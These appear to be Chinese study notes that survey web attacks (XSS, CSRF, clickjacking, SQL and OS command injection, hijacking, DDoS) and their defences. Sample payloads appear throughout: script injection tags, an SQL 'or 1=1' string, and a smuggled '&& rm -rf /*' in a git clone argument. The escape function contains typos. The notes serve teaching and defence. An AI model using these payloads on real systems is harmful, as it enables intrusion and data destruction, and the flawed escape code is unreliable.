# 网络安全
  - 常见的Web攻击方式
    - XSS
      * Cross Site Scripting 跨站脚本攻击，因为缩写和css重叠，所以只能叫XSS。跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的非本站点的html标签或JavaScript进行一种攻击  
      * 跨站脚本攻击可能造成以下影响：  
        1. 利用虚假的输入表单骗取用户个人信息  
        2. 利用脚本窃取用户的Cookie值，被害者在不知情的情况之下，帮助攻击者发送恶意请求  
        3. 显示伪造的文章或者图片  
      * 反射型  - url参数直接注入
        1. 普通 http://localhost:3000/?from=china
        2. alert 尝试 http://localhost:3000/?from=<script>alert(1)<script>
        3. 获取cookie
        4. 短域名伪造

      * 存储型 -存储到DB后读取时注入
      1. <script>alert(1)<script>
      2. <script src="http://localhost:4000/hack.js"><script>  
      * 危害：
        1. 获取页面数据
        2. 获取cookies
        3. 劫持前端逻辑
        4. 发送请求
        5. 偷取网站的任意数据
        6. 偷取用户资料
        7. 偷取用户秘密和用户状态
        8. 欺骗用户

      * 防范手段：
        - ejs转义小知识
          <% code %> 用于执行其中的js代码  
          <% =code %> 会对code进行html转义  
          <% -code %> 不转义
        - ctx.set('X-XSS-Protection', 0) 禁止XSS过滤
        - CSP 内容安全策略  本质就是建立白明单，开发者明确告诉浏览器哪些外部资源是可以加载的，我们只需要做一些配置规则，如何拦截是浏览器的事。(Content-Security-Policy: default-src 'self')只允许加载本站资源
        (Content-Security-Policy: img-src 'https://*')只允许加载HTTPS协议图片
        (Content-Security-Policy: child-src 'none')不允许加载任何来源框架
        - function escape(str) {
          str = str.replace(/&/g, '&amp;')
          str = str.replace(/</g, '&alt;')
          str = str.replace(/"/g, '&quto;')
          str = str.replace(/'/g, '&#39;')
          str = str.replace(/`/g, '&#96;')
          str = str.replace(/\//g, '&#x2F;')
        }
        - htttOnly

    - CSRF(Cross Site Request Forgery)
      * 跨站请求伪造，是一种常见的web攻击，它利用已经登陆身份，在用户不知情的情况下，以用户名义完成非法操作 
      * 危害：
        1. 利用用户登录状态
        2. 用户不知情
        3. 完成业务请求
        4. 盗用用户资金(转账消费)
        5. 冒充用户发帖背锅
        6. 损害网站名誉
      * 防御：
        1. 禁止第三方网站带cookie - 有兼容性问题
        2. Referer Check -https不发生referer
        3. 验证码
    - 点击劫持(clickjacking)
      * 点击劫持是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过iframe嵌套的方式嵌入自己的网页中，应将iframe设置为透明，在页面中透出一个按钮诱导用户点击
      * 防御：
        1. X-FRAME-OPTIONS 是一个http响应头，就是为了防御iframe嵌套的点击劫持
        2. DENY 页面不允许iframe方式展示
        3. SAMEORGIN 页面可以相同域名下通过iframe方式展示
        4. ALLOW-FRAME 允许通过iframe展示
    - SQL注入
      * 1 'or' '1'='1
      SELECT * FROM test.user WHERE username = 'laowang' AND password ='1'or'1'='1'  
      * 防御：
        1. 所有的查询语句建议使用数据库提供的参数化查询接口，参数化语句使用参数，而不是将用户输入的变量嵌入到SQL语句中
        2. 对进入数据库的特殊字符(',",\,<,>,&,*,)进行转义处理
    - OS命令注入
      * OS命令注入和SQL注入差不多，sql注入针对数据库，os注入针对系统
      * 例如：以node.js为例
        const exec = require('mz/child_process).exec
        let params = {<!--用户输入的参数-->}
        exec(`git clone ${params.repo}/some/path`)

        <!-- 坏人 -->
        https://github.com/xx/xx.git && rm -rf /* &&
      * 防范：同上
    - 请求劫持
      * DNS劫持
        1. DNS服务器(DNS解析各个步骤)被篡改，修改域名解析结果，使得访问到的不是预期ip  
      * HTTP劫持
        1. 运营商劫持，此时大概只能升级至https
    - DDOS(distributed denial of service)  
      * http://www.ruanyifeng.com/blog/2018/06/ddos.html
      * 防御：
        1. 备份网站。备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网站出了问题，正在全力抢修。
        2. http请求拦截  
        3. 带宽扩容+cdn 提高犯罪成本

  - 防范方法
    1. 密码安全 -密码加固
      <!-- HTTP + SSL = HTTPS -->
      * 提示密码过于简单
      * 密码加盐
    2. 密码学（对称与非对称）
      * 摘要 - MD5 sha256
      * 对称 - DES
      * 非对称
        1. 产生--对密钥
        2. 公钥负责加密(本地)
        3. 私钥负责解密(服务器)
    3. 传输安全 -HTTPS
    4. NodeJS安全框架 hemelt
    5. CSP策略
    6. 人机识别(图形验证码)